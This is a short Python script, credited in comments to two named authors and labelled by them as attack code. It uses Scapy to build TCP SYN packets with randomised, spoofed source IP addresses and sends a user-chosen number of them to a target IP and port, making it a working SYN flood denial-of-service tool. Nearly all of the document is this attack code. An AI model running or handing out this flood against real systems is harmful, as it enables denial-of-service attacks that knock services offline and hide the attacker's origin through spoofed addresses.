#Anthony Saab and Mansour Abou Shaar develloped this attacke code

from scapy.all import *
import random

#By Anthony:
def tcpSynAtt(desIP,sPort,dPort=80):#packet with given destination Ip, source port, and destination port
    
    #giving the packet a random source IP
    #giving the packets a spesific destination IP
    #giving the packet a spesific source and destination port
    #setting the SYN falg to 1    
    #rest of the fealds will take default values
    packet = IP(src=RandIP(),dst=desIP)/TCP(sport=sPort,dport=dPort,seq=random.randint(0,4294967295),flags="S")
    
    #send the packet
    send(packet)

#By Mansour:
ip=input("Enter Destination IP, ex: 192.168.1.0: ")   
sp=int(input("Enter source port: "))
np=int(input("Enter number of packets to send: "))
for i in range (np):#craft spesified number of packets
    tcpSynAtt(ip,sp)#packet destination Ip, source port, and destination port